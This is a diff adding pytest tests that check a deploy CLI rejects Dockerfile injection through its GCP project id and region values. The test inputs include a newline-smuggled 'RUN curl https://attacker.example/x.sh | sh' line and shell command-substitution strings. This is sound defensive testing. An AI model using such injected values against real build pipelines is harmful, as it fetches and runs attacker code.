@@ -717,6 +717,145 @@ class TestValidateAppName:
     )
 
 
+class TestValidateGcpProjectAndRegion:
+  """Tests for _validate_gcp_project_id/_validate_gcp_region and their deploy call sites.
+
+  Sibling finding to TestValidateAppName above: project and region are
+  interpolated into the same _DOCKERFILE_TEMPLATE (ENV GOOGLE_CLOUD_PROJECT=
+  {gcp_project_id} / ENV GOOGLE_CLOUD_LOCATION={gcp_region}) the exact same
+  way app_name is, and share the same injection risk.
+  """
+
+  @pytest.mark.parametrize(
+      "value",
+      [
+          "proj",
+          "my-project-123",
+          "my_project",
+          "PROJECT1",
+          "a",
+          "a" * 63,
+          "us-central1",
+          "fake_region",
+      ],
+  )
+  def test_accepts_plain_identifiers(self, value: str) -> None:
+    # Should not raise for either validator -- both share the same
+    # character-set restriction.
+    cli_deploy._validate_gcp_project_id(value)
+    cli_deploy._validate_gcp_region(value)
+
+  @pytest.mark.parametrize(
+      "value",
+      [
+          # Breaks out of the ENV instruction to inject a new RUN.
+          "legit-project\nRUN curl https://attacker.example/x.sh | sh\n#",
+          # Breaks out via a quote/space combination.
+          'a" "b',
+          "has space",
+          "a;b",
+          "a|b",
+          "a$(whoami)",
+          "a`whoami`",
+          # Empty and trailing newline.
+          "",
+          "myproject\n",
+      ],
+  )
+  def test_rejects_unsafe_values(self, value: str) -> None:
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy._validate_gcp_project_id(value)
+    assert "Invalid GCP project id" in str(exc_info.value)
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy._validate_gcp_region(value)
+    assert "Invalid GCP region" in str(exc_info.value)
+
+  def test_to_cloud_run_rejects_injection_in_project(
+      self,
+      monkeypatch: pytest.MonkeyPatch,
+      agent_dir: Callable[[bool, bool], Path],
+      tmp_path: Path,
+  ) -> None:
+    src_dir = agent_dir(False, False)
+    monkeypatch.setattr(subprocess, "run", lambda *a, **k: None)
+    monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy.to_cloud_run(
+          agent_folder=str(src_dir),
+          project='legit\nRUN curl https://attacker.example/x.sh | sh\n#',
+          region="us-central1",
+          service_name="svc",
+          app_name="myagent",
+          temp_folder=str(tmp_path),
+          port=8080,
+          trace_to_cloud=False,
+          otel_to_cloud=False,
+          with_ui=False,
+          log_level="info",
+          verbosity="info",
+          adk_version="1.3.0",
+      )
+    assert "Invalid GCP project id" in str(exc_info.value)
+
+  def test_to_cloud_run_rejects_injection_in_region(
+      self,
+      monkeypatch: pytest.MonkeyPatch,
+      agent_dir: Callable[[bool, bool], Path],
+      tmp_path: Path,
+  ) -> None:
+    src_dir = agent_dir(False, False)
+    monkeypatch.setattr(subprocess, "run", lambda *a, **k: None)
+    monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy.to_cloud_run(
+          agent_folder=str(src_dir),
+          project="proj",
+          region='us-central1\nRUN curl https://attacker.example/x.sh | sh\n#',
+          service_name="svc",
+          app_name="myagent",
+          temp_folder=str(tmp_path),
+          port=8080,
+          trace_to_cloud=False,
+          otel_to_cloud=False,
+          with_ui=False,
+          log_level="info",
+          verbosity="info",
+          adk_version="1.3.0",
+      )
+    assert "Invalid GCP region" in str(exc_info.value)
+
+  def test_to_gke_rejects_injection_in_project(
+      self,
+      monkeypatch: pytest.MonkeyPatch,
+      agent_dir: Callable[[bool, bool], Path],
+      tmp_path: Path,
+  ) -> None:
+    src_dir = agent_dir(False, False)
+    monkeypatch.setattr(subprocess, "run", lambda *a, **k: None)
+    monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy.to_gke(
+          agent_folder=str(src_dir),
+          project='legit\nRUN curl https://attacker.example/x.sh | sh\n#',
+          region="us-east1",
+          cluster_name="my-gke-cluster",
+          service_name="gke-svc",
+          app_name="myagent",
+          temp_folder=str(tmp_path),
+          port=9090,
+          trace_to_cloud=False,
+          otel_to_cloud=False,
+          with_ui=False,
+          log_level="debug",
+          adk_version="1.2.0",
+      )
+    assert "Invalid GCP project id" in str(exc_info.value)
+
+
 class TestValidateAgentImport:
   """Tests for the _validate_agent_import function."""
 
